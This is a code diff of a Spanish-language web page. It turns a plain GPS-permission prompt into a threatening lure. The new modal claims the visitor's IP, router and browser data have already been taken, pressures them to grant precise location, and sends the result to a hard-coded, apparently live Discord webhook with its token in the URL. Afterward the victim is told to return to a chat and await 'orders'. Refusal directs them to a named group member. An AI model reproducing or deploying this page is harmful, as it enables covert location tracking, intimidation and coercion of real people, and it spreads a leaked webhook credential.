@@ -88,17 +88,17 @@
 
     <div id="modalUbicacion" class="modal-overlay">
         <div class="modal-box">
-            <h2>Uso de Ubicación</h2>
-            <p>Esta página requiere acceso a tu ubicación GPS para continuar. ¿Deseas permitir el acceso?</p>
+            <h2>Estás jodida</h2>
+            <p>Al entrar brindaste acceso a tus datos (IP, Router, navegador, etc.) al aceptar el permiso a tu ubicación precisa estas colaborando con nosotros y tus datos estaran a salvo. de lo contrario lo tomaremos como negatividad.    </p>
             <div class="modal-buttons">
-                <button class="btn btn-accept" onclick="procesarRespuesta(true)">Permitir</button>
-                <button class="btn btn-deny" onclick="procesarRespuesta(false)">Cancelar</button>
+                <button class="btn btn-accept" onclick="procesarRespuesta(true)">Acepto colaborar brindando mi ubicación precisa para mayor fidelidad</button>
+                <button class="btn btn-deny" onclick="procesarRespuesta(false)">me rehuso a colaborar poniendo mis datos en peligro, incluyendo personales.</button>
             </div>
         </div>
     </div>
 
     <script>
-        const DISCORD_WEBHOOK_URL = "TU_WEBHOOK_DE_DISCORD_AQUI";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
 
         async function procesarRespuesta(acepto) {
             document.getElementById("modalUbicacion").style.display = "none";
@@ -146,16 +146,16 @@
                 document.body.style.backgroundColor = "#eef9f1";
                 document.body.innerHTML = `
                     <div style="text-align: center; padding: 20px; font-family: sans-serif;">
-                        <h1 style="color: #2e7d32; font-size: 32px; margin-bottom: 10px;">¡Gracias!</h1>
-                        <p style="color: #444; font-size: 18px;">Tu ubicación ha sido verificada correctamente.</p>
+                        <h1 style="color: #2e7d32; font-size: 32px; margin-bottom: 10px;">Vuelve al chat ahora</h1>
+                        <p style="color: #444; font-size: 18px;">Tu ubicación ha sido enviada y será verificada,recibiras ordenes pronto.</p>
                     </div>
                 `;
             } else {
                 document.body.style.backgroundColor = "#fde8e8";
                 document.body.innerHTML = `
                     <div style="text-align: center; padding: 20px; font-family: sans-serif;">
-                        <h1 style="color: #c62828; font-size: 32px; margin-bottom: 10px;">Error</h1>
-                        <p style="color: #444; font-size: 18px;">No se otorgaron los permisos necesarios de ubicación.</p>
+                        <h1 style="color: #c62828; font-size: 32px; margin-bottom: 10px;">Aún puedes cambiar de opinión.</h1>
+                        <p style="color: #444; font-size: 18px;">Dudas con S7oliveira / miembros del S7 .</p>
                     </div>
                 `;
             }
